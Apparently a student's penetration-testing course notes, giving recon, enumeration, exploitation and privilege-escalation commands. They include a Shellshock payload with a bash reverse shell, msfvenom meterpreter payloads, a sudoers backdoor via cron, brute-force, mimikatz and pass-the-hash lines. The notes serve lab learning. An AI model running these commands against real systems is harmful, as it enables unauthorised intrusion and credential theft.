# TOOLS TO MASTER
- dirb (dirbuster)
- gobuster
- nmap
- hydra
- smbclient
- rpcclient
- enum4linux
- dnsdumpster.io or dnsrecon
- netcraft.com
- smbmap
- arp-scan
- wireshark
- dig
- METASPLOIT AND MSFVENOM (at least rev. tcp meterpreter payload)
- whatweb
- davtest
- cadaver
- crackmapexec
- mimikatz / kiwi
- 

# Assessment Methodologies: Information Gathering

## Information Gathering
Information Gathering is the first step of any penetration test. It's one of the most important phases, because any further steps are relying on the information we've gathered. Typically we can devide Information-Gathering in two categories:
- Passive Information Gathering
-- Identifying IP addresses & DNS information
-- Identifying domain names and domain ownership information
-- Identifying email addresses and social media profiles
-- Identifying web technologies being used on target sites
-- Identify Subdomains

- Active Information Gathering
-- Discovering open ports on target systems
-- Learning about the internal infrastructure of a target network/organization
-- Enumerating information from targets


## Passive Information Gathering
### Website Recon and Footprinting
- host hackersploit.org -> DNS lookup and get IP-Addresses -> if more than one ipv4 / ipv6 than a proxy or firewall (cloudflare etc.) is likely used by this website.
- check robots.txt file -> is used to refuse crawlers to certain directories / what files should not be indexed
- check sitemap.xml / sitemaps.xml -> provide search engines a sturcture for indexing
- buildwith -> firefox plugin for website technology and cms detection
- wappalyzer -> quite the same as buildwith
- whatweb hackersploit.org -> command for identifying web technologies and plugins that is used (equivalent to plugins mentioned above)
- httrack -> program to copy a website locally for further analysis
- whois hackersploit.org or who.is website-> query dns register

### Website Footprinting with Netcraft
- netcraft.com -> Scan a website for technology, network information, first seen, hsoting history, basic ssl vulnerability check etc.
- Easy to consume infos (collection of all methods / commands mentioned above)


### DNS Recon
- dnsrecon -d gkd-group.com -> get all dns records (NS, A, TXT, MX ..)
- dnsdumpster.io -> best dns reconnaicance tool for organized information!!!

### Detect WAF with wafw00f
- wafw00f http://www.gkd-group.com -> check if a waf is used

### subdomain enumeration with sublist3r
- sublist3r -d [DOMAIN] (opt. -t threads; -b bruteforce; -e search engines)
- -b belongs to active reconnaicance.

### Google Dorks
- site: -> limit all results to a given Domain e.g. site: gkd-group.com; site:*.ine.com -> show all subdomains that have been indexed by google.
- inurl: -> search for a part of a url e.g. site:gkd-group.com inurl:wp-content
- intitle: -> specific keyword in site-title
- filetype: -> show all files of a specific filetype e.g. pdf
- intitle:index of -> common vulnerability of directory listing.
- cache: show older versions of a website (for more details better use waybachmachine -> web.archive.org
- Use GOOGLE HACKING DATABASE (GHDB) on exploit-db.com to show some interesting queries.

### E-Mail Harvesting with theHarvester
- theHarvester command / program is preistalled on Kali & Parrot
- theHarvester -d example.com -l 500 -b linkedin -> searches for linkedin information to a given domain
- spyse source is very interesting but requires a subscription

### Leaked Password Databases
- good for password spraying ;)
- haveibeenpwned.com -> Aggregates various databreaches all over the world



## Active Information Gathering

### DNS Zone Transfers
A DNS Zone Transfer is the process to move zone Files from one DNS-Server to another. If misconfigured and left unsecured, this functionality can be abused by attackers to copy the zone files from the primary DNS server to another DNS server. A DNS Zone transfer can provide penetrations testers with a holistic view of an organizations network layout. 
- dnsenum example.com -> tries also to perform a Zone transfer
- dig axfr @NAMESERVER DOMAIN -> axfr is the Zone Transfer Switch
- fierce -dns hackersploit.org -> DNS Bruteforce

### Host Discovery with NMAP
- sN Option -> No Port-Scan Option, only Host discovery (Also known as Ping Scan or Ping Sweep) [nmap -sn 10.0.0.0/16]
- 
- OR USE NETDISCOVER to discover devices via ARP Requests. [sudo netdisvover]


### Port Scanning with NMAP
- Standard NMAP scan is a SYN scan for the 1000 most common ports
- Windows Machine can block Ping requests by default. In this case, NMAP fires up the error "Host seems down.". In this case try the -Pn switch to avoid an availability Ping Scan. (DO not check if host is down)
- nmap -Pn -p- x.x.x.x -> Scanning all Ports
- nmap -Pn -p 80 -> Scan port 80
- nmap -Pn -p 80,445,139 -> Scan a Port selection
- nmap -Pn -p 21-100 -> Scan within a given Range
- By default NMAP will perform a TCP Port-Scan. Use the -sU switch to perform a UDP scan.
- -v switch increases the verbosity
- -sV Service Version detection
- -O switch performs a Operation System Scan (not very accurate)
- -F Fast Switch (scan fewer ports than default)
- -T1-5 switch to speed up a scan (0 = paranoid; 5 = insane)
- -sU -> Perform a UDP Scan, because by default nmap will discover tcp connections. This scan will take some time!
- --top-port 25 --open -> scan top 25 ports and filter for open ports


# Assessment Methodologies: Footprinting and Scanning

## Mapping the Network
- Before any Penetration Test will start, a Scope needs to be defined. It's important that a P-test will provide a value for a customer and will not knock-out production systems.
- Physical Access (Physical Security, OSINT, Social Engineering)
- Sniffing (Passive Recon, Watch network traffic)
- ARP ()
- ICMP (Tracroute, Ping)

Tools -> WIRESHARK, ARP-SCAN, PING, FPING, NMAP, ZENMAP

### ARP-SCAN
- Run an ARP-SCAN via sudo arp-scan -I eth0 -g 10.0.0.0/16

### FPING
- Can send packets to multiple hosts at a time
- fping -I eth0 -g 10.0.0.0/16 -a 2>/dev/null    (filter out errors with the last part)





# Assessment Methodologies: Enumeration
"Enumeration is the method that a penetration tester uses to identify information about in-scope assets."
"Enumeration is defined as a process which establishes an active connection to the target hosts to discover potential attack vectors..."

## SMB: Windows Discover and Mount
- Discover via nmap (Usually Port 445 / 139 TCP).
- Linux: List SMB shares of a Server -> smbclient -L //Server
- Linux: Connect to SMB Share -> smbclient //Server/Share -U USERNAME
- Windows: Connec to SMB Share -> net use Z: \\Server\\Share PASSWORD /user:USERNAME
- Windows: Direct Access -> \\SERVER\SHARE

## SMB: NMAP Scripts
- Run nmap and identify potential targets that are using smb.
- After a target is identified, run nmap -p445 --script smb-protocols 10.x.x.x -> E.g. check if SMBv1 is used.
- nmap -p445 --script smb-security-mode 10.x.x.x -> e.g. ceck is message signing is disabled.
- nmap -p445 --script smb-enum-sessions 10.x.x.x -> Get active / logged on users with active sessions
- nmap -p445 --script smb-enum-shares 10.x.x.x -> Share enumeration
- nmap -p445 --script smb-enum-users --script-args smbusername=USERNAME,smbpassword=PASSWORD 10.x.x.x
- nmap -p445 --script smb-enum-domains --script-args smbusername=USERNAME,smbpassword=PASSWORD 10.x.x.x 10.x.x.x
- nmap -p445 --script smb-enum-shares,smb-ls --script-args smbusername=USERNAME,smbpassword=PASSWORD 10.x.x.x -> enum and list share content


## SMB: SMBMAP
- Knowing when there is a Server that supports smbv1, we can utilize smbmap with a null-session.
- smbmap -u guest -p "" -d . -H 10.x.x.x
- If you get results with guest user and a null session for more than read access to IPC$ and print$ share, you should report this.
- SMBmap supports some other commands like uploading a file or listing a shared drive. See Documentation -> https://github.com/ShawnDEvans/smbmap


## Linux Samba
- metasploit has some samba / smb enumeration and exploit tools
- nmblookup -A <IP-ADDRESS>
- If we can see IPC$ with a null session you can probably connect via rpc (rpcclient)
- RPC NULL SESSION CONNECT: rpcclient -U '' -N 192.x.x.x

With an anonymous null session you can access the IPC$ share and interact with services exposed via named pipes. The enum4linux utility within Kali Linux is particularly useful; with it, you can obtain the following:
- Operating system information
- Details of the parent domain
- A list of local users and groups
- Details of available SMB shares
- The effective system security policy

## enum4linux
  - Power Tools for Linux and Windows enumeration tasks
  - USAGE: enum4linix -o 192.x.x.x

## Check for SMB Dialect / Versions of smb2
  - start metasploit
  - use auxiliary/scanner/smb/smb2
  - set RHOSTS x.x.x.x
  - run
  
## User enumeration with SMB and RPC
  - NMAP smb-enum-users script
  - Enum4Linux -> shows users
  - rpcclient NULL session and enter following command: enumdomusers
  
  
## SMB Dictionary Attack
  - Start Metasploit
  - use auxiliary/scanner/smb/smb_login
  - show options
  - at least fill RHOSTS
  - set an smb user
  - set a pass_file
  - run exploit
  
  - Using Hydra:
  - hydra -l <USERNAME> -P <PATH TO PASS-FILE> <IP> smb
  
## Find out services which are piped through smb -> named pipes are used for service communication
  - start metasploit
  - use auxiliary/scanner/smb/pipe_auditor
  - set smbuser
  - set smbpass
  - set rhosts
  
## Get SID of Users 
  - enum4linux -r -u 'admin' -p 'password1' 192.x.x.x
  

  
## FTP
- Maybe use Hydra to Bruteforce ftp: hydra -l <USERNAME> -P <PATH TO PASS-FILE> <IP> ftp
- Check for anonymous login: nmap x.x.x.x -p21 --script ftp-anon (Or try manually by username "anonymous" and no password)
  
  
## SSH
- netcat (nc) can also grab a banner by default connection (just like with an nmap service scan)
- nmap x.x.x.x -p22 --script ssh2-enum-algos -> Enumerate Alogrithms for Key creation
- nmap x.x.x.x -p22 --script ssh-hostkey --script-args ssh_hostkey=full -> Grab the full rsa hostkey (WRITE THAT DOWN!)
- nmap x.x.x.x -p22 --script ssh-auth-methods --script-args="ssh.user=admin" -> show authentication methods -> if it shows none_auth THATS DANGEROUS AND WRITE THAT DOWN!
- Dictionary Attack: hydra -l <NAME> -P /usr/share/wordlists/rockyou.txt <IP> ssh
- Bruteforce with NMAP: nmap x.x.x.x -p22 --script ssh-brute --script-args userdb=/root/user
- METASPLOIT: use auxiliary/ssh/ssh_login -> set RHOSTS, set userpass_file, set STOP_ON_SUCCESS, DEFAULT USERNAME IS ROOT
  
  
## HTTP
  ### IIS
  - whatweb <IP or DOMAIN> -> basic enumeration
  - dirb http://<DOMAIN or IO> -> Find directories with default wordlist
  - browsh --startup-url http://x.x.x.x/Default.aspx -> Rendering a website in shell
  - nmap scripts:
    - nmap x.x.x.x -sV -p80 --script http-enum
    - nmap x.x.x.x -sV -p80 --script http-headers (HTTP HEADER INFORMATION)
    - nmap x.x.x.x -sV -p80 --script http-methods --script-args http-methods.url-path=/webdav/ (or something else..)
    - nmap x.x.x.x -sV -p80 --script http-webdav-scan --script-args http-methods.url-path=/webdav/ -> WEBDAV Scan
  
  ### APACHE
  - the same from above applies also here!
  - msfconsole
    - use auxiliary/scanner/http/http_version (check the options and run)
    - use auxiliary/scanner/http/brute_dirs -> Bruteforce / Wordlist Directories
    - ROBOTS.TXT: use auxiliary/scanner/http/robots_txt
  
  
  ## MySQL
  
  - Connect to mysql via shell
    - mysql -h x.x.x.x -u root
  - show databases;
  - use database;
  - select * from table;
  - metasploit enumeration on writeable directories of the operating system
    - use auxiliary/scanner/mysql/mysql_writable_dirs (set options (dir_list etc.) and run the exploit and maybe set verbose to false because it will tell us a lot :D )
  - dump hashes with metasploit
    - use auxiliary/scanner/maysql/mysql_hashdump -> set at least username and password and rhosts -> WRITE HASHES DOWN!
  - load system files (if we have access which should be present to previous enumeration)
    - select load_file("/etc/shadow"); -> if that works, WRITE THAT DOWN!
  - check for empty password login with nmap
    - nmap x.x.x.x -sV -p 3306 --script=mysql-empty-password
  - nmap x.x.x.x -sV -p3306 --script=mysql-users --script-args="mysqluser='root,mysqlpass=''" -> Write all users down
  - nmap x.x.x.x -sV -p3306 --script=mysql-databases --script-args="mysqluser='root,mysqlpass=''" -> Shows all Databases
  - nmap mysql-audit script can be useful. Check documentation for more info!
  
  - DICTIONARY ATTACK
    - via msfconsole -> use auxiliary/scanner/mysql/mysql_login -> set all options (pass_file etc.), set stop_on_success true and verbose to false!
    - via hydra -> hydra -l root -P <wordlist> x.x.x.x mysql
  
  ## MSSQL
  - nmap x.x.x.x -p1433 --script ms-sql-info -> general information
  - nmap x.x.x.x -p1433 --script ms-sql-ntlm-info --script-args mssql.instance-port=1433 -> ntlm info
  - nmap x.x.x.x -p1433 --script ms-sql-brute --script-args userdb=<PATH>,passdb=<PATH> -> Bruteforce / Dictionary Attack
  - nmap x.x.x.x -p1433 --script ms-sql-empty-password -> Check for empty passwords
  
  - hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt 192.168.1.128 mssql
  
  - you can also run querys with nmap, check the documentation.
  
  - nmap x.x.x.x -p1433 --script ms-sql-dump-hashes --script-args mssql.username=admin,mssql.password=anamaria
  
  - Run cmd command:
    - nmap x.x.x.x -p1433 --script ms-sql-xp-cmdshell --script-args mssql.username=admin,mssql.password=anamaria,ms-sql-xpcmdshell.cmd="ipconfig" -> Just an example
    - nmap x.x.x.x -p1433 --script ms-sql-xp-cmdshell --script-args mssql.username=admin,mssql.password=anamaria,ms-sql-xpcmdshell.cmd="type c:\flag"
  
  
  - Enumerate MSSQL with Metasploit
    - use auxiliary/scanner/mssql/mssql_login -> set rhosts; set user_file; set pass_file -> exploit
    - use auxiliary/admin/mssql/mssql_enum -> set rhosts at least...
    - use auxiliary/admin/mssql/mssql_enum_sql_logins -> Enumerating possible Logins
    - use auxiliary/admin/mssql/mssql_exec -> check if you can run commands -> set cmd whoami (just as an example)
    - use auxiliary/admin/mssql/mssql_enum_domain_accounts
 
  
# Assessment Methodologies: Vulnerability Assessment
  
  ## Vulnerability overview
  - What is a vulnerability? (NIST) -> A weakness in the computational logic (e.g. code) found in software and hardware components that, wen exploited, results in a negative impact to confidentiality, integrity, or availability.
  
  - CVE (Common Vulnerabilities and Exposures)
  - NVD (National Vulnerability Database)
  

# Compliance Check of Systems
  
  - https://www.stigviewer.com/
  - https://www.niwcatlantic.navy.mil/scap/ (SCAP Vulnerability Scanner) -> Download here: https://public.cyber.mil/stigs/scap/
  
# Host and Network Penetration Testing: System / Host Based Attacks
  - Most frequently exploited windows services
    - IIS (TCP 80 /443)
    - WebDAV (TCP 80 / 443) -> HTTP extension that allows clients to update, delete, move and copy files in a webserver. (Web Server act as a File-Server)
    - SMB / CIFS (TCP 445) -> Network File Sharing
    - RDP (TCP 3389) -> GUI Remote Access Protocol
    - WinRM (TCP ports 5986/443) -> Windows remote management protocol that can be used to faciliate remote access with Windows Systems
  
  
  ### Exploiting Microsoft IIS WebDAV
    - run nmap -sV -p xxx --script=http-enum x.x.x.x to find out if a webserver uses WebDAV
    - run "davtest" command to enumerate with parameters -url -auth username:password to perform some checks of webdav server
    - use "cadaver http://xxxxxxxx/webdav/" to access contents within the webdav server
  
  ### Exploiting Microsoft IIS WebDav via Metersploit
    - Get a Payload :)
      - msfvenom -p windows/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=xxxx -f asp > revshell.asp (Get a asp reverse shell via msfvenom)
    - upload the payload via cadaver
    - start msfconsole with postgresql (systemctl start postgresql or service postgresql start && msfconsole)
      - use multi/handler
      - set payload windows/meterpreter/reverse_tcp
      - specify LHOST and LPORT
      - run -> to start the listener and execute the shell on the webdav server.
  
  ### Exploiting SMB with PsExec
  
    - SMB is a network file sharing protocol
    - SMB is frequently used to share printers or files in a local area network
    - SMB runs on TCP 445 and originally on top of NetBIOS (TCP 139)
    - SAMABA is the Linux implementation of SMB
  
  SMB Authentication process
  ![grafik](https://user-images.githubusercontent.com/58482416/207962932-8bca3853-de10-44d9-bcb7-c8af8ea1284d.png)

  PSExec is a lightweight telnet replacement and it is very siliar to RDP (CMD level). PsExec Authentication is performed via SMB.
  
  Bruteforce smb login via metasploit
  
    - use auxiliary/scanner/smb/smb_login
    - show options and specify the needed values
  
  
  Psexec.py is the python linux implementation of psexec
    Usage: psexec.py Administrator@x.x.x.x cmd.exe
    
    
    
    ### Exploiting RDP (Bruteforce)
    
  - RDP runs by default on TCP 3389, but be aware and always do a full scan, because some companies switch to a different port
  - Veryfiy if a port is used for RDP with metasploit module auxiliary/scanner/rdp/rdp_scanner
  - Bruteforce RDP with hydra: hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt rdp://10.0.0.31 -s 3333 (s specifies the Port)
  
  - use xfreerdp to connect: xfreerdp /u:administrator /p:qwertyuiop /v:10.0.0.31:3333
  
  ### Exploiting Windows CVE-2019-0708 RDP Vulnerability (BlueKeep)
  - Bluekeep allows attackers to remotely execute arbitary code and gain access to a Windows system
  - You will always get an elevated shell (system)
  - Effects XP, Vista, Windows 7, Windows Server 2008 & R2
  - Exploit is very instable and may cause system crashes frequently
  - there are msf modules to exploit this vulnerability. Just search for bluekeep
  - THIS EXPLOIT IS NOT RECOMMENDED TO RUN IN A VULNERABLITY ASSESSMENT, BECAUSE KERNEL EXPLOITS CAN CRASH SYSTEMS AND MAY CAUSE DATA LOSS!!!!!
  
  
  
  ### Exploiting WinRM
  - Windows feature, that can be configured and do not run by default. It is a remote Management Protocol that can be used to facilitate remote access to Windows systems over http(s)
  - It typical uses TCP 5985 and 5986 (https)
  - Various forms of authntication exists, normally by username and password (or by a hash)
  - We can utilize a utility called "crackmapexec" to perform a brute-force on WinRM
  - to obtain a command shell we can use "evil-winrm" (ruby script)
  
  - crackmapexec winrm x.x.x.x -u administrator -p /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt (you can also specify multiple users in a list (just like with the -p parameter above))
  - crackmapexec winrm x.x.x.x -u administrator -p tinkerbell  -x "whoami" (Example to run code on a target, x = execute)
  
  - evil-rinrm.rb -u administrator -p 'tinkerbell' -i x.x.x.x (Directly establish a PowerShell connection, thats AWESOME!)
  
  - metasploit: search for "winrm_script" and use the exploit (set FORCE_VBS to true; Fill out all required fields) -> This is used to get a meterpreter session and obtain system rights! <3 (But credentials are needed :()
  
  
  ## Windows Privilege Escalation
  Privilege escalation = elevation of privileges from a user to another (higher priviledged) via exploring vulnerabilities or misconfigurations
  
  ### Windows Kernel Exploits
  Kernel is the core of an Operating System and is resposible for many operations (I/O, Memory Management)
  The Windows Kernel is Called "Windows NT" and has two operation modes: User Mode (Programs and services running in user mode have limited access to system resources) and Kernel Mode (unrestricted access to system resources)
  Privilege escalation on Windows systems will typically follow the following methodology:
  - Identify kernel vulnerabilities
  - Downloading, compiling and transferring kernel exploits to the target system
  
  Kernel exploits are in most cases very unstable and may cause system damage and data loss. Therfore it is not recommended to do that in a pentesting szenario.
  
  To Identify Exploits, use Windows-Exploit-Suggester or Windows-Kernel-Exploits (It compares targets patch level against microsofts vulnerability database
  - Windows-Kernel-Exploits: https://github.com/SecWiki/windows-kernel-exploits
  - Windows-Exploits-Suggester: https://github.com/AonCyberLabs/Windows-Exploit-Suggester
  
  -> You can do that with metasploit, just search for suggester post exploitation module (after you have a session; You will need to specify the session as an option.)
  
  ### UAC Bypassing with UACMe
  
  - UAC is the User Account Control and is present in every Version of Windows since Windows Vista.
  - UAC is used to ensure that changes to the os require approval from an administrator
  - Attacks can bypass UAC to execute malicious executables with elevated privileges
  
  - You will need a local administrators password account! (Thats a prerequisite!)
  - Tool we are going to use: https://github.com/hfiref0x/UACME
  - You will need to transfer this executable to a client and you can use it to run executables with elevated privileges without a confirmation of an admin.
  - When UAC is set to the highest integrity level, it is very difficult to bypass. Only works fine with default settings
  
  - Used Command in the lab: Akagi64.exe 23 C:\Users\admin\AppData\Local\Temp\backdoor.exe
  
  
  # GET FAMILIAR WITH MSFVENOM (generating rev tcp payload) and IN GENERAL WITH MSFCONSOLE! BYPASSUAC LAB IS GREAT TO LEARN
  
  
  ### Access Token Impersonation
  
  - A windows access token is responsible for identifiying and describing the security context of a process or thread running on a system. Simply put, an access token can be thought of as a temporary key akin to a web cookiue that provides users with access to a system or network resource without having to privide credentials each time a process is started or a resource is accessed.
  - Access tokens are a core element of the authentication process on windows and are created and managed by the Local Security Authority Subsystem Service (LSASS)
  - Access tokens are generated by the winlogon.exe process every time a user authenticates successfully and includes the identity and privileges of the user account associated with the thread or process. This token is then attached to the userinit.exe process, after which all child processes started by a user will inherit a copy of the access token from their creator and will run under the privileges of the same access token.
  
  - Windows access tokens are categorized based on the varying security levels assigned to them:
    - Impersonate-level tokens are created as a direct result of a non-interactive login on Windows, typically through specific system services or domain logons
    - Delegate-level tokens are typically created through an interactive login on windows, primilary through a traditinal login or through remote access protocols such as RDP
  - Impersonate-level Tokens = impersonate a token on the LOCAL SYSTEM
  - Delegate-level tokens = can impersonate tokens ON ANY SYSTEM! (extremly dangerous!)
  
  - Which windows privileges (meterpreter: getprivs) are needed for this attack?
    - SeAssignPrimaryToken
    - SeCreateToken
    - SeImpersonatePrivilege -> This is needed!!
  
  - We are always looking for admin users with local administrative privileges when performing this attack type.
  - We will be using meterpreter with the buid-in incognito module!
  
  - load the module: in an active session run "load incognito"
  - list_tokens -u (to list all available user account tokens)
  - copy the name of the access token in quotes, eg "COMPUTERNAME\Administrator"
  - impersonate_token "COMPUTERNAME\Administrator" -> This will impersonate the token and elevate our privs.
  
  
  ## Windows File System Vulnerabilities
  
  ### Alternate Data Streams (hiding malicious payload and executables in ligitimate files)
  - Alternate Data Streams (ADS) is an NTFS (New Technology File System) file attribute and was designed to provide compatibility with the MacOS HFS (Hierarchical File System)
  - Any file created on an NTFS formatted drive will have two different forks/streams
    - Data stream - Default stream that contains the data of the file
    - Resource stream - Typically contains the metadata of the file
  
  - Attackers can use ADS to hide malicious code or executables in legitimate files in order to evade detection
  - This can be done by storing the malicious code or executables in the file attribute resource stream (metadata) of a legitimate file.
  - This technique is usually used to evade basic signature based AVs and static scanning tools
  
  - Research again how it's exactly working.
    - notepad test.txt:secret.txt
    - type payload.exe > test.txt:payload.exe (Hide an executable)
    - run this by creating a symbolic link or in cmd via start command (not always working fine)
  
  
  
  ## Windows Credential Dumping
  
  ### Windows Password Hashes
  
  - Windows OS stores hashed user accounts passowrds locally in the SAM (Security Accounts Manager) database.
  - Authentication and verification of user credentials is facilitated by the Local Security Authority (LSA)
  - Windows versions up to Windows Server 2003 utilize two different types of hashes:
    - LM -> LM is not case sensetive and uses no salts
    - NTLM
  - Windows disables LM hashing and utilizes NTLN hashing from Windows Vista onwards!!!
  - It is likely to come across NTLM and NT hashes! LM hashes are completely outdated!
  - The SAM Database can - for security reasons - not be copied while the os is running
  - Attackers can utilize the LSASS process to in-memory dump SAM hashes
  - In modern versions of Windows, the SAM Database is encrypted with a syskey
  - Elevated / Administrative privileges are required in order to access and interact with the LSASS process.
  
  - NTLM (or NThash) is used by Vista onwards. It is encrypted using the MD4 hashing algorithm.
  - NTLM Hashing process:
  ![grafik](https://user-images.githubusercontent.com/58482416/208968684-263c0dad-f5cd-4ea1-861b-85658c142906.png)

  
  ### Searching for Passwords In Windows Configuration Files
  - Windows Configuration Files can contain sensetive Information
  - Unattended Windows Setup Utility is used for mass installations and can left configuration files on the local client
  - The Unattended Windows Setup Utility will typically utilize one of the follwoing configuration files that contain user account and system configuration information:
    - C:\Windows\Panther\Unattend.xml
    - C:\Windows\Panther\Autounattend.xml
  - NOTE: THE PASSWORD STRINGS MAY BE ENCODED USING BASE64
  
  
  ### Dumping hashes with Mimikatz
  - Mimikatz is the defacto-standard when it comes to post-exploitation on windows systems
  - It allows the extraction of clear-text passwords, hashes and Kerberos tickets from memory
  - It can be used to extract hashes from the lsass.exe process memory where hashes are cached
  - We utilize the pre-compiled mimikatz tool, but you can also the the meterpreter extension called Kiwi
  - Mimicatz will require elevated privileges in order to run correctly (administrator or system)
  
  
  - Process in general from a remote computer
    - Initial exploit and get a meterpreter session
    - try to elevate privs to admin account
    - check meterpreter session architecture (x86 is not so good...) with sysinfo
    - migrate to the lsass proccess to get a 64bit shell and access to the sam db (with kiwi / mimikatz)
    - lsa_dump_sam -> will dump the syskey and the NTLM hashes
    - type "help" for help ;)
  
  
  - For the use of mimikatz, visit: https://adsecurity.org/?page_id=1821
    - privilege::debug
    - LSADUMP::SAM -> get the SysKey to decrypt SAM entries (from registry or hive). The SAM option connects to the local Security Account Manager (SAM) database and dumps credentials for local accounts. This is used to dump all local credentials on a Windows computer.
  
  
  ### Pass the Hash Attacks
  
  - What can we do with hashes we've obtained apart from cracking them?
  - We can utilize NTLM hashes to authenticate with a target system via SMB
  - We can Use the Metasploit PsExec Module or CrackMapExec
  
  - With PsExec Module
    - use ecploit/smb/psexec
    - set LPORT, RHOSTS, SMBUser and SMBPass (Here you can specify a clear text password or the hash!)
  
  - With crackmapexec
    - crackmapexec smb x.x.x.x -u Administrator -H "<<HASH>>"
    - hit enter and here you go. (you can specify commands with the -x option (e.g. -x "ipconfig"))
  
  - winrm can also be used to perform a PTH attack
  
  
  # Host & Network Penetration Testing: System/Host Based Attacks  (LINUX-PART)
  
  ## Linux Vulnerabilities
  
  ### Frequently Exploited Linux Services
  
  - Linux Distros share the same Kernel and are all Linux variants. In most cases only the user interface is really different (and the command set in some cases)
  -Frequently exploited Linux Services
    - Apache Web Server (80 % of Web-Servers globally!!); TCP 80 /443
    - SSH; TCP 22
    - FTP; TCP 21
    - SAMBA; TCP 445
  
  
  ## Exploiting Linux Vulnerabilities
  
  ### Exploiting Bash CVE-2014-6271 Vulnerability (Shellshock)
  - Bash is the default shell for nearly all Linux Distros
  - The Shellshock vulnerability is caused by a vulnerability in Bash, wehereby Bash mistakenly executes trailing commands after a series of characters: (){:;};
  - In context of remote exploitation, Apache web servers configured to run CGI scripts or .sh scripts are also vulnerable to this attack.
  
  - In oder to exploit this vulnerability, you will need to locate an input vector or script that allows you to communicate with Bash
  - This vulnerability can be exploited both manually (e.g. via Burp) and automatically with the use of MSF exploit module 
  
  - Check if a Webservice is vulnerable: nmap -sV x.x.x.x --script=http-shellshock --script-args "http-shellshock.uri=/gettime.cgi" (specify the location of the uri!)
  - Fire up Brup and intercept a respose from the vulnerable cgi module
  - Send it to repeater and replace the User-Agent to: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd' (Bash Rev. Shell: bash -i >& /dev/tcp/10.0.0.1/8080 0>&1)
  
  
  ### Exploiting FTP
  - FTP authentication requires a username and password combination. As a result, we can perform a bruteforce attack in the FTP Server in order to identify legitimate credentials.
  - In some cases, FTP servers may be configured to allow anonymous access, whick consequently allows anyone to access to the FTP server without providing legitimate credentials.
  
  - Hydra Bruteforce FTP:
    - hydra -L /usr/share/.... -P /usr/share/.... -vV 192.168.1.1 ftp (vV is optional)
  - Or use the ftp-brute NMAP Script.
  
  ### Exploiting SSH
  - SSH authentication can be configured in two ways. Username & Password authentication or Key-based authentication (In case of Username and PW, we can bruteforce this shit. (Or at least try it)
  - Bruteforce with Hydra: hydra -L /usr/share/... -P /usr/share/... x.x.x.x ssh
  
  ### Exploiting SAMBA
  - Network File Sharing Protocol (TCP 445); It is the Linux implementation of SMB
  - SAMBA utilizes a unsername and password authentication and we can perform a bruteforce attack with hydra
  - We can use SMBMap in order to enumerate SAMBA share dirves and list their contents
  - we can use smbclient to connect to a share
  
  - List samba shares on a target with autnentication
    - smbclient -U admin -L //x.x.x.x
  - Login to an samba share
    - smbclient -U admin  //x.x.x.x/sharename
  - perform a hydra bruteforce attack
    - hydra -l admin -P /usr/share/wordlists/.... smb x.x.x.x
  
  
  ## Linux Privilege Escalation
  
  ### Linux Kernel Exploits
  - Linux Exploit suggester (for identifying kernel vulnerabilities. Kernel Version and Distribution release version are the most important information) -> https://github.com/mzet-/linux-exploit-suggester
  - Downlaod, compile (gcc) and run the exploit
  - KERNEL EXPLOITS ARE TARGETING THE KERNEL / CORE OF AN EXPLOIT AND YOU CAN CAUSE CRASHES AND DATA LOSS (not recommended)
  
  
  ### Exploiting Misconfigured Cron Jobs
  - Linux implements task scheduling through a utility called Cron.
  - Cron is a time-based service that runs applications, script and other commands 
  - The crontab file is a configuration file that is used by the Cron utility to store and track Cron Jobs that have been created
  - Cron jobs can also be RUN AS ANY USER ON THE SYSTEM. This is a very important factor to keep an eye on as we will be targeting Cron jobs that have configured to be run as the "root" user.
  - It's crucial to find a file that is used in a cronjob and we have write access to this file with our current priveleges.
  
  - In the Lab, we were courious about a file called "message" and we didn't have access to it. Its also strage, that this file in the students home is owned by root, but we didn't know the purpose of this specific file.
  - So what we can do is that we can search if the specific path to that file is mentioned in a script. Because mostly scripts are stored in the /usr/ directory, we will search for that.
    grep -rnw /usr -e "/home/student/message"
  - Get yourself in the sudoers file and allow it all
  - echo 'echo "student ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers' >> copy.sh
  - ELEVATE PRIVS AND GET ROOT SHELL WITH "sudo su"
  
 ### Exploiting SUID Binaries
  - What is the SUID permission?
  - In addition to the three main file access permissions (read, write, execute), Linux also provides users with specialized permissions that can be utilized in specific situations. One of these access permissions is the SUID (Set Owner User ID) permission.
  - When applied, this permission provides users with the ability to execute a script or binary with the permissions of the file owner as opposed to the user that is running the script or binary.
  - SUID permissions are usually used to provide unprivileged users with the ability to run specific scripts or binaries with root permissions.
  
  - find suid permissions: find / -perm -u=s -type f 2>/dev/null
  
  - Maybe we find something that we can elevate our Privs...
  - USE https://gtfobins.github.io/
  - In the lab it was a very easy demonstration. Given two files, one has set the suid bit and the other don't. But the second file waws loaded from the first and we have write privs to that file. So we deleted the loaded file and copied /bin/bash and named it like the loaded file. Now we are root...
  

  ## Linux Credential Dumping
  ### Dumping Linux Password Hashes
  - Pass the Hash attacks did'nt really work in Linux, so the only thin we can do with hashes is cracking them!
  - All information for all accounts on Linux is stored in the passwd file located under: /etc/passwd
  - We cannot view the passwords in the passwd file because they are encrypted
  - The passwd file can be read by any user on the system
  - ALL ENCRYPTED PASSWORDS FOR THE USERS ARE STORED IN THE SHADOW FILE: /etc/shadow
  - The shadow file can only be accessed by the ROOT user
  - The Passwd File gives us information about the encryption algorithm that is used (see table)
  **![image](https://user-images.githubusercontent.com/58482416/209317906-349c43ce-a0bc-4342-9514-68886d7123a7.png)**
  - Cracking a Linux shadow hash with john the ripper:
    - Copy the Line from Shadow (or multiple) in a seperate txt file
    - john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
    - Mostly john will automatically determine the correct hash algo, but you can also specify that (look at the picture to identify with hash is used)
  
  
  # INFO Upgrade a session to a meterpreter session, list sessions -> sessions -u 1
  
  
  # Host & Network Penetration Testing: Network-Based Attacks
  
  ## Network-Based Attacks
  
  ### Network Based Attacks Part 1 and 2 (Basics)
  - Common network services: ARP, DHCP, SMB, FTP, Telnet, SSH
  ### TShark
  - Tshark is the command-line version of wireshark
  - see tshark -h to open the help menu
  - Skipped the lab. Look here if you need some help regarding the commands: https://www.wireshark.org/docs/man-pages/tshark.html
  
  ### ARP Poisoning
  - echo 1 > /proc/sys/net/ipv4/ip_forward (Enable IP forwarding)
